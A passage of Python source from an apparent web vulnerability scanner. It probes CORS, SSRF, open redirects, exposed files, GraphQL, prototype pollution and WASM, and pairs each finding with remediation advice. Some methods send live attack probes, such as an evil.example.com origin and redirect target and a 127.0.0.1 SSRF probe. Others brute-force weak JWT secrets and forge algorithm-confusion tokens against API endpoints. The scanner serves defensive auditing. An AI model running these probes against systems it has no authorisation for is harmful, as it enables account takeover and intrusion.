                "Add: X-Content-Type-Options: nosniff",
                2.7, "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options",
            ),
            "referrer-policy": (
                WebRiskLevel.LOW, 0.95,
                "Missing Referrer-Policy Header",
                "No Referrer-Policy means browsers use their default, potentially leaking URLs.",
                "Add: Referrer-Policy: strict-origin-when-cross-origin or no-referrer",
                2.0, "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy",
            ),
            "permissions-policy": (
                WebRiskLevel.LOW, 0.90,
                "Missing Permissions-Policy Header",
                "No Permissions-Policy leaves browser features (camera, geolocation, mic) unrestricted.",
                "Add: Permissions-Policy: camera=(), microphone=(), geolocation=()",
                1.8, "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy",
            ),
        }

        for header, (sev, conf, title, desc, remed, cvss, ref) in required_headers.items():
            if header not in hdrs:
                if header == "strict-transport-security" and urlparse(surface.base_url).scheme != "https":
                    continue
                findings.append(self._finding(
                    "header", title, sev, conf,
                    surface.base_url, header, desc,
                    f"Header '{header}' not present in response",
                    remed, [ref], cvss,
                ))

        if "x-xss-protection" not in hdrs:
            findings.append(self._finding(
                "header", "Missing X-XSS-Protection Header", WebRiskLevel.INFO, 0.90,
                surface.base_url, "x-xss-protection",
                "X-XSS-Protection is deprecated in modern browsers but its absence may "
                "affect older browser support.",
                "Header 'x-xss-protection' not present",
                "Set X-XSS-Protection: 0 (to disable the buggy XSS auditor) and rely on CSP instead.",
                ["https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection"],
                0.0,
            ))

        return findings

    # =========================================================================
    # TLS Analysis
    # =========================================================================

    async def run_tls_analysis(self, url: str) -> list[WebFinding]:
        """Check TLS configuration. Runs testssl.sh if available, otherwise basic checks."""
        findings: list[WebFinding] = []
        parsed = urlparse(url)

        if parsed.scheme == "http":
            findings.append(self._finding(
                "tls",
                "Application Served Over HTTP (No TLS)",
                WebRiskLevel.HIGH,
                1.0,
                url, "",
                "The application is served over plain HTTP. All traffic (including "
                "credentials and session tokens) is transmitted in cleartext.",
                f"URL scheme is 'http': {url}",
                "Enforce HTTPS for all endpoints. Obtain a TLS certificate and redirect "
                "all HTTP traffic to HTTPS. Configure HSTS.",
                ["https://owasp.org/www-community/vulnerabilities/Insecure_Transport",
                 "https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html"],
                cvss_score=7.5,
            ))
            return findings

        host    = parsed.hostname or ""
        port    = parsed.port or 443
        stdout, _, _ = await self._run_tool(
            ["testssl.sh", "--jsonfile", "-", f"{host}:{port}"],
            self._tool_timeout, "testssl.sh",
        )
        if stdout:
            try:
                tls_data = json.loads(stdout)
                for entry in tls_data if isinstance(tls_data, list) else []:
                    severity_map = {"CRITICAL": WebRiskLevel.CRITICAL, "HIGH": WebRiskLevel.HIGH,
                                    "MEDIUM": WebRiskLevel.MEDIUM, "LOW": WebRiskLevel.LOW,
                                    "INFO": WebRiskLevel.INFO}
                    sev = severity_map.get(str(entry.get("severity", "INFO")).upper(), WebRiskLevel.INFO)
                    if sev in (WebRiskLevel.CRITICAL, WebRiskLevel.HIGH, WebRiskLevel.MEDIUM):
                        findings.append(self._finding(
                            "tls",
                            f"TLS Issue: {entry.get('id', 'unknown')}",
                            sev, 0.85,
                            url, "TLS",
                            str(entry.get("finding", "")),
                            str(entry.get("finding", "")),
                            "Upgrade TLS configuration. Disable weak ciphers and protocols.",
                            ["https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html"],
                        ))
            except (json.JSONDecodeError, ValueError):
                pass

        async with self._make_client() as client:
            try:
                resp = await client.get(url)
                if resp and resp.http_version == "HTTP/1.1":
                    findings.append(self._finding(
                        "tls",
                        "HTTP/2 Not Enabled",
                        WebRiskLevel.INFO, 0.80,
                        url, "",
                        "The server does not support HTTP/2. "
                        "HTTP/2 provides better performance and security primitives.",
                        f"HTTP version: {resp.http_version}",
                        "Enable HTTP/2 support in your web server configuration.",
                        ["https://httpwg.org/specs/rfc9113.html"],
                        0.0,
                    ))
            except Exception:
                pass

        return findings

    # =========================================================================
    # CORS Analysis
    # =========================================================================

    async def run_cors_analysis(self, surface: AttackSurface) -> list[WebFinding]:
        """Test for CORS misconfigurations by probing with attacker-controlled origins."""
        findings: list[WebFinding] = []

        test_origins = [
            "https://evil.example.com",
            "null",
            f"https://evil.{urlparse(surface.base_url).hostname}",
        ]

        async with self._make_client() as client:
            for origin in test_origins:
                if self._check_kill():
                    break
                resp = await self._get(
                    client, surface.base_url,
                    headers={"Origin": origin},
                )
                if resp is None:
                    continue
                acao = resp.headers.get("access-control-allow-origin", "")
                acac = resp.headers.get("access-control-allow-credentials", "false")

                if acao == "*" and acac.lower() == "true":
                    findings.append(self._finding(
                        "cors",
                        "CORS: Wildcard Origin with Credentials Allowed",
                        WebRiskLevel.CRITICAL,
                        0.98,
                        surface.base_url, "Origin",
                        "The server responds with Access-Control-Allow-Origin: * combined "
                        "with Access-Control-Allow-Credentials: true. Browsers block this, "
                        "but it indicates a misconfigured CORS policy.",
                        f"ACAO: {acao}, ACAC: {acac}",
                        "Never combine wildcard ACAO with ACAC: true. "
                        "Maintain an explicit allowlist of trusted origins.",
                        ["https://portswigger.net/web-security/cors",
                         "https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS/Errors"],
                        cvss_score=9.0,
                    ))
                elif acao == origin and acac.lower() == "true":
                    findings.append(self._finding(
                        "cors",
                        f"CORS: Arbitrary Origin Reflected with Credentials — {origin}",
                        WebRiskLevel.HIGH,
                        0.90,
                        surface.base_url, "Origin",
                        f"The server reflected the attacker-controlled origin '{origin}' in "
                        "ACAO and permits credentials. This enables cross-origin requests with "
                        "user credentials from any allowed page.",
                        f"Origin: {origin} → ACAO: {acao}, ACAC: {acac}",
                        "Validate the Origin header against an explicit allowlist. "
                        "Do not reflect arbitrary origins in ACAO.",
                        ["https://portswigger.net/web-security/cors"],
                        cvss_score=8.1,
                    ))
                elif acao == "*":
                    findings.append(self._finding(
                        "cors",
                        "CORS: Wildcard Origin Allowed",
                        WebRiskLevel.MEDIUM,
                        0.95,
                        surface.base_url, "Origin",
                        "The server allows any origin via Access-Control-Allow-Origin: *. "
                        "This is acceptable for public APIs but problematic for authenticated endpoints.",
                        f"ACAO: * (Origin tested: {origin})",
                        "Scope wildcard CORS only to truly public, non-authenticated endpoints. "
                        "Use an origin allowlist for authenticated APIs.",
                        ["https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS"],
                        cvss_score=5.4,
                    ))

        return findings

    # =========================================================================
    # Sensitive File Scan
    # =========================================================================

    async def run_sensitive_file_scan(self, surface: AttackSurface) -> list[WebFinding]:
        """Probe for exposed sensitive files (.env, .git, backups, config files)."""
        findings: list[WebFinding] = []
        paths    = self._cfg.get("sensitive_paths", [])

        async with self._make_client() as client:
            base = surface.base_url.rstrip("/")
            for path in paths:
                if self._check_kill():
                    break
                url  = f"{base}{path}"
                resp = await self._get(client, url)
                if resp is None or resp.status_code != 200:
                    continue
                content = resp.text[:2000]

                # robots.txt is informational — existence alone is not a vulnerability
                if path in ("/robots.txt", "/robots.txt/"):
                    findings.append(self._finding(
                        "sensitive_file",
                        f"robots.txt Accessible — {path}",
                        WebRiskLevel.INFO, 0.50,
                        url, "",
                        "robots.txt is publicly accessible. Review for sensitive path disclosures. "
                        "Existence alone is not a vulnerability.",
                        f"HTTP {resp.status_code} for {url}. Content: {content[:200]}",
                        "Review robots.txt for paths that reveal internal application structure. "
                        "Do not rely on robots.txt to hide sensitive endpoints.",
                        ["https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/01-Conduct_Search_Engine_Discovery_Reconnaissance_for_Information_Leakage"],
                        cvss_score=0.0,
                    ))
                    continue

                if _SENSITIVE_CONTENT_RE.search(content):
                    sev  = WebRiskLevel.CRITICAL
                    conf = 0.97
                    desc = (
                        f"Sensitive file '{path}' returned HTTP 200 AND contains "
                        "credentials or secret keys. Confirmed exposure."
                    )
                    cvss = 9.1
                elif path.endswith((".git/config", ".git/HEAD")):
                    sev  = WebRiskLevel.HIGH
                    conf = 0.88
                    desc = (
                        f"Git repository metadata at '{path}' is publicly accessible. "
                        "May expose commit history, branch names, and remote URLs."
                    )
                    cvss = 7.5
                else:
                    # HTTP 200 without sensitive content — low risk
                    sev  = WebRiskLevel.LOW
                    conf = 0.60
                    desc = (
                        f"File '{path}' returned HTTP 200 but no credentials or secrets "
                        "were detected in the response. Review manually."
                    )
                    cvss = 3.1

                findings.append(self._finding(
                    "sensitive_file",
                    f"Sensitive File Exposed — {path}",
                    sev, conf,
                    url, "",
                    desc,
                    f"HTTP {resp.status_code} for {url}. Content: {content[:200]}",
                    f"Block direct access to '{path}' via web server configuration. "
                    "Move sensitive files outside the web root. "
                    "Audit deployment scripts to prevent secrets from being committed.",
                    ["https://owasp.org/www-community/vulnerabilities/Insecure_Direct_Object_Reference"],
                    cvss_score=cvss,
                ))

        return findings

    # =========================================================================
    # Debug Endpoint Discovery
    # =========================================================================

    async def run_debug_endpoint_scan(self, surface: AttackSurface) -> list[WebFinding]:
        """Probe for exposed admin, debug, and framework management endpoints."""
        findings: list[WebFinding] = []
        endpoints = self._cfg.get("debug_endpoints", [])

        async with self._make_client() as client:
            base = surface.base_url.rstrip("/")
            for ep in endpoints:
                if self._check_kill():
                    break
                url  = f"{base}{ep}"
                resp = await self._get(client, url)
                if resp is None:
                    continue
                if resp.status_code in (200, 401, 403):
                    sev  = WebRiskLevel.HIGH if resp.status_code == 200 else WebRiskLevel.MEDIUM
                    conf = 0.90 if resp.status_code == 200 else 0.65
                    findings.append(self._finding(
                        "debug_endpoint",
                        f"{'Accessible' if resp.status_code == 200 else 'Protected'} Admin/Debug Endpoint — {ep}",
                        sev, conf,
                        url, "",
                        f"Admin/debug endpoint '{ep}' returned HTTP {resp.status_code}. "
                        + ("It is accessible without authentication." if resp.status_code == 200
                           else "It is gated (401/403) but its presence should be reviewed."),
                        f"HTTP {resp.status_code} for {url}",
                        "Remove or restrict all debug and admin endpoints in production. "
                        "Use IP allowlisting or VPN for administrative interfaces. "
                        "Disable framework debug modes (debug=False, RAILS_ENV=production).",
                        ["https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods"],
                        cvss_score=7.5 if sev == WebRiskLevel.HIGH else 4.3,
                    ))

        return findings

    # =========================================================================
    # SSRF Tests
    # =========================================================================

    async def run_ssrf_tests(self, surface: AttackSurface) -> list[WebFinding]:
        """
        Identify parameters that accept URLs and flag them as potential SSRF vectors.
        Does not trigger actual internal requests on foreign infrastructure.
        """
        findings: list[WebFinding] = []
        ssrf_param_names = set(self._cfg.get("ssrf_params", [
            "url", "uri", "link", "src", "source", "href", "fetch",
            "load", "path", "img", "image", "proxy", "host", "endpoint", "webhook",
        ]))

        async with self._make_client() as client:
            for url, params in surface.parameters.items():
                if self._check_kill():
                    break
                for param in params:
                    if param.lower() not in ssrf_param_names:
                        continue
                    probe = "http://127.0.0.1/"
                    t0    = time.monotonic()
                    resp  = await self._get(client, url, params={param: probe})
                    dt    = time.monotonic() - t0
                    if resp is None:
                        continue
                    if dt > 2.0 or (resp.status_code in (200, 500) and "connection refused" not in resp.text.lower()):
                        findings.append(self._finding(
                            "ssrf",
                            f"Potential SSRF — {param}",
                            WebRiskLevel.HIGH,
                            0.65,
                            url, param,
                            f"Parameter '{param}' accepts URLs. When probed with "
                            f"'http://127.0.0.1/' the server responded (status={resp.status_code}, "
                            f"delay={dt:.1f}s) in a way consistent with server-side URL fetching.",
                            f"SSRF probe to {probe} via '{param}' → HTTP {resp.status_code} in {dt:.1f}s",
                            "Validate and sanitise all URL parameters server-side. "
                            "Use an allowlist of permitted schemes and hosts. "
                            "Disable following redirects in HTTP client libraries. "
                            "Block access to internal network ranges from the application host.",
                            ["https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
                             "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html"],
                            cvss_score=8.6,
                        ))

        return findings

    # =========================================================================
    # Open Redirect Tests
    # =========================================================================

    async def run_open_redirect_tests(self, surface: AttackSurface) -> list[WebFinding]:
        """Detect open redirect vulnerabilities in redirect-accepting parameters."""
        findings: list[WebFinding] = []
        redirect_params = set(self._cfg.get("redirect_params", [
            "url", "redirect", "redirect_url", "redirect_uri", "return",
            "return_url", "next", "next_url", "target", "destination",
            "dest", "goto", "callback", "continue", "forward",
        ]))
        probe_url = "https://evil.example.com/"

        async with self._make_client() as client:
            for url, params in surface.parameters.items():
                if self._check_kill():
                    break
                for param in params:
                    if param.lower() not in redirect_params:
                        continue
                    resp = await self._get(client, url, params={param: probe_url})
                    if resp is None:
                        continue
                    final_url = str(resp.url)
                    history_urls = [str(r.url) for r in resp.history]
                    all_urls     = history_urls + [final_url]
                    if any("evil.example.com" in u for u in all_urls):
                        findings.append(self._finding(
                            "open_redirect",
                            f"Open Redirect — {param}",
                            WebRiskLevel.MEDIUM,
                            0.95,
                            url, param,
                            f"Parameter '{param}' redirected the browser to the attacker-controlled "
                            "URL 'https://evil.example.com/', confirming an open redirect vulnerability.",
                            f"Redirect chain: {' → '.join(all_urls[:5])}",
                            "Validate redirect targets against an allowlist of trusted domains. "
                            "Use relative paths for internal redirects. "
                            "Never redirect to user-supplied absolute URLs.",
                            ["https://owasp.org/www-community/attacks/Unvalidated_Redirects_and_Forwards_Cheat_Sheet",
                             "https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html"],
                            cvss_score=4.7,
                        ))
                    elif resp.status_code in (301, 302, 303, 307, 308):
                        loc = resp.headers.get("location", "")
                        if probe_url in loc:
                            findings.append(self._finding(
                                "open_redirect",
                                f"Open Redirect (Unvalidated Location Header) — {param}",
                                WebRiskLevel.MEDIUM,
                                0.90,
                                url, param,
                                f"Location header contains the attacker-controlled URL without validation.",
                                f"Location: {loc}",
                                "Validate the Location header value against an explicit allowlist.",
                                ["https://owasp.org/www-community/attacks/Unvalidated_Redirects_and_Forwards_Cheat_Sheet"],
                                cvss_score=4.7,
                            ))

        return findings

    # =========================================================================
    # GraphQL Security Analysis
    # =========================================================================

    async def run_graphql_analysis(self, surface: AttackSurface) -> list[WebFinding]:
        """Check for exposed GraphQL introspection and common GraphQL misconfigurations."""
        findings: list[WebFinding] = []
        graphql_paths = ["/graphql", "/api/graphql", "/v1/graphql", "/v2/graphql", "/graphiql", "/playground", "/gql"]
        base = surface.base_url.rstrip("/")

        # Add discovered GraphQL endpoints
        graphql_paths.extend(surface.graphql_endpoints)

        async with self._make_client() as client:
            for path in graphql_paths:
                if self._check_kill():
                    break
                full_url = path if path.startswith("http") else f"{base}{path}"
                if full_url.startswith("ws"):
                    continue

                resp = await self._post(
                    client, full_url,
                    json_={"query": "{__typename}"},
                    headers={"Content-Type": "application/json"},
                )
                if resp is None or resp.status_code not in (200, 400):
                    continue
                try:
                    data = resp.json()
                except (json.JSONDecodeError, ValueError):
                    continue

                if "data" in data or "errors" in data:
                    intro_resp = await self._post(
                        client, full_url,
                        json_={"query": "{__schema{types{name}}}"},
                        headers={"Content-Type": "application/json"},
                    )
                    if intro_resp:
                        try:
                            intro_data = intro_resp.json()
                        except (json.JSONDecodeError, ValueError):
                            intro_data = {}
                        if "data" in intro_data and intro_data["data"]:
                            findings.append(self._finding(
                                "graphql",
                                f"GraphQL Introspection Enabled — {path}",
                                WebRiskLevel.MEDIUM,
                                0.95,
                                full_url, "",
                                "GraphQL introspection is enabled in a production endpoint. "
                                "This exposes the entire schema, type structure, and available "
                                "queries/mutations to attackers.",
                                f"Introspection query to {full_url} returned schema types",
                                "Disable introspection in production. "
                                "Use persisted queries. Implement query depth limiting and complexity analysis.",
                                ["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/12-API_Testing/01-Testing_GraphQL"],
                                cvss_score=5.3,
                            ))

                    ide_resp = await self._get(client, full_url)
                    if ide_resp and "graphiql" in ide_resp.text.lower():
                        findings.append(self._finding(
                            "graphql",
                            f"GraphQL IDE (GraphiQL) Exposed — {path}",
                            WebRiskLevel.HIGH,
                            0.92,
                            full_url, "",
                            "A GraphQL IDE (GraphiQL or Apollo Playground) is publicly accessible. "
                            "This provides an interactive interface to explore and query the API.",
                            f"GraphiQL interface found at {full_url}",
                            "Disable the GraphQL IDE in production environments. "
                            "Restrict access to internal networks only.",
                            ["https://graphql.org/learn/introspection/"],
                            cvss_score=6.5,
                        ))

        return findings

    # =========================================================================
    # JWT Security Analysis
    # =========================================================================

    async def run_jwt_analysis(self, surface: AttackSurface) -> list[WebFinding]:
        """Analyse JWT tokens found in cookies and headers for security weaknesses."""
        findings: list[WebFinding] = []

        tokens: list[tuple[str, str]] = []
        for cookie in surface.cookies:
            val = cookie.get("value", "")
            if _JWT_RE.match(val):
                tokens.append((f"Cookie:{cookie['name']}", val))

        auth_hdr = surface.headers.get("authorization", "")
        m        = _JWT_RE.search(auth_hdr)
        if m:
            tokens.append(("Authorization header", m.group(0)))

        for location, token in tokens:
            try:
                parts = token.split(".")
                if len(parts) != 3:
                    continue
                header_b64 = parts[0] + "=="
                payload_b64= parts[1] + "=="
                header  = json.loads(base64.urlsafe_b64decode(header_b64))
                payload = json.loads(base64.urlsafe_b64decode(payload_b64))
            except Exception:
                continue

            alg = header.get("alg", "").upper()

            if alg == "NONE":
                findings.append(self._finding(
                    "jwt",
                    f"JWT Algorithm 'none' — {location}",
                    WebRiskLevel.CRITICAL,
                    0.98,
                    surface.base_url, location,
                    "JWT token uses algorithm 'none', meaning the signature is not verified. "
                    "An attacker can forge arbitrary tokens.",
                    f"JWT header: {json.dumps(header)} at {location}",
                    "Reject JWTs with alg=none server-side. "
                    "Use an allowlist of accepted algorithms. Require HS256/RS256/ES256.",
                    ["https://portswigger.net/web-security/jwt",
                     "https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html"],
                    cvss_score=9.8,
                ))

            if alg.startswith("HS"):
                weak_secrets = self._load_payloads("jwt")
                for secret in weak_secrets[:20]:
                    signing_input = f"{parts[0]}.{parts[1]}".encode()
                    alg_map = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
                    hash_fn = alg_map.get(alg, hashlib.sha256)
                    expected = base64.urlsafe_b64encode(
                        hmac.new(secret.encode(), signing_input, hash_fn).digest()
                    ).rstrip(b"=").decode()
                    if expected == parts[2]:
                        findings.append(self._finding(
                            "jwt",
                            f"JWT Signed with Weak Secret — {location}",
                            WebRiskLevel.CRITICAL,
                            0.99,
                            surface.base_url, location,
                            f"JWT token signature was successfully verified using the weak "
                            f"secret '{secret}'. An attacker can forge tokens.",
                            f"JWT at {location} signed with secret '{secret}'",
                            "Use a cryptographically random secret of at least 256 bits. "
                            "Rotate all JWT secrets immediately. "
                            "Consider RS256/ES256 asymmetric signing.",
                            ["https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key"],
                            cvss_score=9.8,
                        ))
                        break

            exp = payload.get("exp")
            if exp is None:
                findings.append(self._finding(
                    "jwt",
                    f"JWT Without Expiry Claim — {location}",
                    WebRiskLevel.MEDIUM,
                    0.95,
                    surface.base_url, location,
                    "JWT token has no 'exp' (expiry) claim. Tokens are valid indefinitely, "
                    "increasing risk from token theft.",
                    f"JWT payload has no 'exp' claim at {location}",
                    "Always include a short-lived 'exp' claim in JWTs. "
                    "Implement refresh token rotation.",
                    ["https://www.rfc-editor.org/rfc/rfc7519#section-4.1.4"],
                    cvss_score=5.4,
                ))

        return findings

    # =========================================================================
    # Prototype Pollution Tests
    # =========================================================================

    async def run_prototype_pollution_tests(self, surface: AttackSurface) -> list[WebFinding]:
        """Detect prototype pollution vectors in query parameters and JSON bodies."""
        findings: list[WebFinding] = []
        probes = [
            ("__proto__[test]", "polluted"),
            ("constructor[prototype][test]", "polluted"),
        ]

        async with self._make_client() as client:
            for url, params in surface.parameters.items():
                if self._check_kill():
                    break
                for proto_key, proto_val in probes:
                    resp = await self._get(client, url, params={proto_key: proto_val})
                    if resp is None:
                        continue
                    if proto_val in resp.text or resp.status_code == 500:
                        sev  = WebRiskLevel.HIGH if proto_val in resp.text else WebRiskLevel.MEDIUM
                        conf = 0.75 if proto_val in resp.text else 0.45
                        findings.append(self._finding(
                            "prototype_pollution",
                            f"Potential Prototype Pollution — {proto_key}",
                            sev, conf,
                            url, proto_key,
                            f"Parameter '{proto_key}={proto_val}' caused the value to appear in "
                            "the response or triggered a 500 error, suggesting server-side "
                            "prototype pollution in a JavaScript runtime.",
                            f"Probe '{proto_key}={proto_val}' → HTTP {resp.status_code}; "
                            f"value in response: {proto_val in resp.text}",
                            "Sanitise object keys server-side. Use Object.create(null) for user-data "
                            "objects. Apply JSON schema validation. Use a prototype-pollution-safe "
                            "deep-merge library.",
                            ["https://portswigger.net/web-security/prototype-pollution",
                             "https://owasp.org/www-project-web-security-testing-guide/"],
                            cvss_score=7.3 if sev == WebRiskLevel.HIGH else 5.0,
                        ))

            # Check JS files for prototype pollution sinks
            for js in surface.js_files[:20]:
                if self._check_kill():
                    break
                resp = await self._get(client, js)
                if resp and _PROTOTYPE_POLLUTION_SINKS.search(resp.text):
                    findings.append(self._finding(
                        "prototype_pollution",
                        f"Prototype Pollution Sink in JS File — {js}",
                        WebRiskLevel.MEDIUM,
                        0.60,
                        js, "",
                        "JavaScript file contains known prototype pollution sink functions "
                        "(structuredClone, Object.assign, _.set, etc.).",
                        f"JS file {js} contains prototype pollution sink: "
                        f"{_PROTOTYPE_POLLUTION_SINKS.findall(resp.text)[:3]}",
                        "Review usage of deep-merge utilities. "
                        "Use Object.create(null) for user-controlled objects. "
                        "Apply schema validation before merging.",
                        ["https://portswigger.net/web-security/prototype-pollution"],
                        cvss_score=5.5,
                    ))

        return findings

    # =========================================================================
    # ADVANCED 2026 MODULES
    # =========================================================================

    # ── 1. JWT Algorithm Confusion (Post-Quantum Downgrade) ───────────────

    async def run_jwt_algorithm_confusion_tests(self, surface: AttackSurface) -> list[WebFinding]:
        """
        Test JWT algorithm confusion attacks including post-quantum algorithm
        downgrade (CRYSTALS-Dilithium → HS256) and public key as HMAC secret.
        """
        findings: list[WebFinding] = []

        tokens: list[tuple[str, str]] = []
        for cookie in surface.cookies:
            val = cookie.get("value", "")
            if _JWT_RE.match(val):
                tokens.append((f"Cookie:{cookie['name']}", val))

        auth_hdr = surface.headers.get("authorization", "")
        m        = _JWT_RE.search(auth_hdr)
        if m:
            tokens.append(("Authorization header", m.group(0)))

        if not tokens:
            return findings

        # Test algorithm confusion payloads
        alg_confusion_payloads = [
            {"alg": "HS256", "typ": "JWT"},
            {"alg": "HS384", "typ": "JWT"},
            {"alg": "HS512", "typ": "JWT"},
            {"alg": "none", "typ": "JWT"},
            {"alg": "None", "typ": "JWT"},
            {"alg": "NONE", "typ": "JWT"},
            {"alg": "null", "typ": "JWT"},
            {"alg": "hs256", "typ": "JWT"},
        ]

        async with self._make_client() as client:
            for location, token in tokens:
                try:
                    parts = token.split(".")
                    header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
                    orig_alg = header.get("alg", "").upper()
                except Exception:
                    continue

                # Check if original algorithm is asymmetric (RS/ES/PS)
                if not orig_alg.startswith(("RS", "ES", "PS", "ED")):
                    continue

                # Test downgrade to post-quantum algorithm names
                pq_algorithms = [
                    "CRYSTALS-Dilithium", "CRYSTALS.Dilithium", "CRYSTALS_Dilithium",
                    "Dilithium2", "Dilithium3", "Dilithium5",
                    "FALCON", "FALCON-512", "FALCON-1024",
                    "SPHINCS+", "SPHINCSPlus", "SPHINCS_Plus",
                ]

                for pq_alg in pq_algorithms:
                    if self._check_kill():
                        break
                    forged_header = base64.urlsafe_b64encode(
                        json.dumps({"alg": pq_alg, "typ": "JWT"}).encode()
                    ).rstrip(b"=").decode()
                    forged_token = f"{forged_header}.{parts[1]}.{parts[2]}"

                    for api_url in surface.api_endpoints[:3]:
                        resp = await self._get(
                            client, api_url,
                            headers={"Authorization": f"Bearer {forged_token}"},
                        )
                        if resp and resp.status_code == 200:
                            findings.append(self._add_advanced_finding(self._finding(
                                "jwt_algorithm_confusion",
                                f"JWT Post-Quantum Algorithm Accepted — {pq_alg}",
                                WebRiskLevel.CRITICAL,
                                0.92,
                                api_url, location,
                                f"The server accepted a JWT with post-quantum algorithm "
                                f"'{pq_alg}' without proper signature validation. This "
                                f"indicates algorithm confusion vulnerability.",
                                f"JWT with algorithm '{pq_alg}' accepted at {api_url}",
                                "Disable support for 'none' algorithm and all post-quantum algorithm "
                                "names in JWT libraries. Maintain an explicit allowlist of accepted "
                                "algorithms. Use JWT library that validates algorithm against expected value.",
                                ["https://portswigger.net/web-security/jwt/algorithm-confusion",
                                 "https://www.rfc-editor.org/rfc/rfc7515#section-4.1.1"],
                                cvss_score=9.8,
                                module="jwt_algorithm_confusion",
                            )))

                # Test HS256 with public key as secret
                resp = await self._get(client, f"{surface.base_url}/.well-known/jwks.json")
                public_key_content = ""
                if resp and resp.status_code == 200:
                    public_key_content = resp.text
                else:
                    for jwks_path in ["/jwks.json", "/api/jwks", "/.well-known/openid-configuration"]:
                        resp = await self._get(client, f"{surface.base_url}{jwks_path}")
                        if resp and resp.status_code == 200:
                            public_key_content = resp.text
                            break

                if public_key_content:
                    forged_header_b64 = base64.urlsafe_b64encode(
                        json.dumps({"alg": "HS256", "typ": "JWT"}).encode()
                    ).rstrip(b"=").decode()
                    signing_input = f"{forged_header_b64}.{parts[1]}".encode()
                    for secret_attempt in [public_key_content, public_key_content[:100]]:
                        signature = base64.urlsafe_b64encode(
                            hmac.new(secret_attempt.encode(), signing_input, hashlib.sha256).digest()
                        ).rstrip(b"=").decode()
                        forged_token = f"{signing_input.decode()}.{signature}"

                        for api_url in surface.api_endpoints[:3]:
                            resp = await self._get(
                                client, api_url,
                                headers={"Authorization": f"Bearer {forged_token}"},
                            )
                            if resp and resp.status_code == 200:
                                findings.append(self._add_advanced_finding(self._finding(
                                    "jwt_algorithm_confusion",
                                    "JWT Algorithm Confusion (RS→HS with Public Key)",
                                    WebRiskLevel.CRITICAL,
                                    0.97,
                                    api_url, location,
                                    "Successfully forged a JWT using HS256 algorithm signed with "
                                    "the server's public key as the HMAC secret. This confirms "
                                    "algorithm confusion vulnerability.",
                                    f"HS256 token signed with public key accepted at {api_url}",
                                    "Never use the same JWT validation library for both asymmetric "
                                    "and symmetric algorithms. Always validate the 'alg' header against "
                                    "an expected value before verification.",
                                    ["https://portswigger.net/web-security/jwt/algorithm-confusion"],
                                    cvss_score=10.0,
                                    module="jwt_algorithm_confusion",
                                )))
                                break

        return findings

    # ── 2. WASM Memory Corruption (Edge Runtime JIT Bugs) ─────────────────

    async def run_wasm_memory_corruption_tests(self, surface: AttackSurface) -> list[WebFinding]:
        """
        Detect WebAssembly memory corruption vectors in edge runtime environments.
        Checks for exposed WASM files, JIT compilation hints, and unsafe memory access patterns.
        """
        findings: list[WebFinding] = []

        async with self._make_client() as client:
            # Probe all discovered WASM files for unsafe patterns
            for wasm_url in surface.wasm_files[:10]:
                if self._check_kill():
                    break
                resp = await self._get(client, wasm_url)
                if resp is None or resp.status_code != 200:
                    continue

                # Check for WASM magic bytes and unsafe memory patterns in surrounding JS
                ct = resp.headers.get("content-type", "")
                if "wasm" in ct or wasm_url.endswith(".wasm"):
                    findings.append(self._add_advanced_finding(self._finding(
                        "wasm_memory_corruption",
                        f"WebAssembly Module Exposed — {wasm_url}",
                        WebRiskLevel.MEDIUM,
                        0.75,
                        wasm_url, "",
                        "A WebAssembly module is publicly accessible. WASM modules may contain "
                        "unsafe memory operations, JIT compilation bugs, or V8/edge runtime "
                        "sandbox escape vulnerabilities if running in Cloudflare Workers, Deno, or Fastly.",
                        f"WASM file returned HTTP 200 at {wasm_url}",
                        "Audit WASM modules for unsafe memory operations (unrestricted grow, "
                        "out-of-bounds access). Use WASM GC proposals. Isolate WASM execution "
                        "contexts. Apply Content-Security-Policy with wasm-unsafe-eval restrictions.",
                        ["https://webassembly.org/docs/security/",
                         "https://owasp.org/www-project-web-security-testing-guide/"],
                        cvss_score=5.8,
                        module="wasm_memory_corruption",
                    )))

            # Check JS files for WASM instantiation patterns
            for js_url in surface.js_files[:20]:
                if self._check_kill():
                    break
                resp = await self._get(client, js_url)
                if resp is None or resp.status_code != 200:
                    continue
                if _WASM_GC_RE.search(resp.text):
                    # Look for dangerous WASM patterns
                    dangerous_patterns = [
                        (r"WebAssembly\.Memory\s*\(\s*\{[^}]*maximum\s*:\s*(?:undefined|null)", "unbounded memory growth"),
                        (r"wasm_bindgen|__wbg_|__wbindgen_", "wasm-bindgen unsafe boundary"),
                        (r"memory\.grow\b", "WASM linear memory grow"),
                        (r"SharedArrayBuffer", "SharedArrayBuffer (Spectre risk)"),
                    ]
                    for pattern, label in dangerous_patterns:
                        if re.search(pattern, resp.text, re.I):
                            findings.append(self._add_advanced_finding(self._finding(
                                "wasm_memory_corruption",
                                f"WASM Unsafe Pattern Detected ({label}) — {js_url}",
                                WebRiskLevel.MEDIUM,
                                0.60,
                                js_url, "",
                                f"JavaScript file contains potentially unsafe WebAssembly pattern: {label}. "
                                "This could be exploitable in edge runtimes with JIT compilation enabled.",
                                f"Pattern '{label}' found in {js_url}",
                                "Restrict WASM memory growth with explicit maximum bounds. "
                                "Avoid SharedArrayBuffer unless strictly necessary. "
                                "Enable COOP/COEP headers to isolate cross-origin memory.",
